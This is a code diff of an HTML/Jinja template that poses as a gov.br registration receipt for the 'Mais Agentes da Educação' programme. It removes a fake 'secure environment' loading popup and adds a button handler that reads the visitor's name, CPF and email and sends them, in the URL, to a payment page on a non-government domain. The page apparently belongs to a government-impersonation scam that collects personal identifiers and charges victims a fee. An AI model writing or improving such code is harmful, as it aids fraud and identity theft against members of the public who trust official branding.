@@ -3,38 +3,6 @@
 {% block title %}{{ page_title or "Comprovante de Inscrição - Mais Agentes da Educação - gov.br" }}{% endblock %}
 
 {% block content %}
-<!-- Popup de Carregamento Seguro -->
-<div id="popup-carregamento-seguro" class="fixed inset-0 bg-black bg-opacity-50 z-50 hidden flex items-center justify-center">
-    <div class="bg-white rounded-lg shadow-xl p-8 max-w-md w-full mx-4 text-center">
-        <!-- Logo Gov.br -->
-        <div class="mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
-                 alt="Gov.br" 
-                 class="h-16 mx-auto">
-        </div>
-        
-        <!-- Título Principal -->
-        <h3 class="text-xl font-bold text-blue-900 mb-4">
-            Carregando Ambiente Seguro...
-        </h3>
-        
-        <!-- Descrição -->
-        <p class="text-gray-700 mb-6 leading-relaxed">
-            Estamos preparando um ambiente seguro para o processamento do seu pagamento. Por favor, aguarde um momento.
-        </p>
-        
-        <!-- Loading Spinner -->
-        <div class="mb-6">
-            <div class="animate-spin rounded-full h-12 w-12 border-b-4 border-blue-600 mx-auto"></div>
-        </div>
-        
-        <!-- Texto de Segurança -->
-        <p class="text-sm text-gray-600 leading-relaxed">
-            Seus dados estão protegidos conforme a Lei Geral de Proteção de Dados (LGPD) e as melhores práticas de segurança.
-        </p>
-    </div>
-</div>
-
 <div class="px-4 py-4">
     <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Comprovante de Inscrição</h1>
     
@@ -530,45 +498,33 @@ document.addEventListener('DOMContentLoaded', function() {
         // Evento do botão finalizar
         btnFinalizar.addEventListener('click', function() {
             if (!this.disabled) {
-                // Mostrar popup de carregamento seguro
-                mostrarPopupCarregamentoSeguro();
+                // Obter dados salvos do usuário
+                const dadosCpf = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
+                const emailSalvo = document.getElementById('email-comprovante').value;
+                
+                // Construir parâmetros da URL
+                const params = new URLSearchParams();
+                
+                if (dadosCpf.nome) {
+                    params.append('name', dadosCpf.nome);
+                }
+                
+                if (dadosCpf.cpf) {
+                    params.append('document', dadosCpf.cpf);
+                }
+                
+                if (emailSalvo) {
+                    params.append('email', emailSalvo);
+                }
+                
+                // Redirecionar para página de pagamento com parâmetros
+                const urlCheckout = `https://pay.cadastroagentesdaeducacao.org/rn4RgQ6aVAA3wBV?${params.toString()}`;
+                window.location.href = urlCheckout;
             }
         });
         
         // Scroll para a seção
         termosSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    }
-    
-    // Função para mostrar popup de carregamento seguro
-    function mostrarPopupCarregamentoSeguro() {
-        // Obter dados salvos do usuário
-        const dadosCpf = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
-        const emailSalvo = document.getElementById('email-comprovante').value;
-        
-        // Construir parâmetros da URL
-        const params = new URLSearchParams();
-        
-        if (dadosCpf.nome) {
-            params.append('name', dadosCpf.nome);
-        }
-        
-        if (dadosCpf.cpf) {
-            params.append('document', dadosCpf.cpf);
-        }
-        
-        if (emailSalvo) {
-            params.append('email', emailSalvo);
-        }
-        
-        // Mostrar popup
-        const popup = document.getElementById('popup-carregamento-seguro');
-        popup.classList.remove('hidden');
-        
-        // Aguardar 2 segundos e redirecionar
-        setTimeout(() => {
-            const urlCheckout = `https://pay.cadastroagentesdaeducacao.org/rn4RgQ6aVAA3wBV?${params.toString()}`;
-            window.location.href = urlCheckout;
-        }, 2000);
     }
     
     // Função para formatar CPF
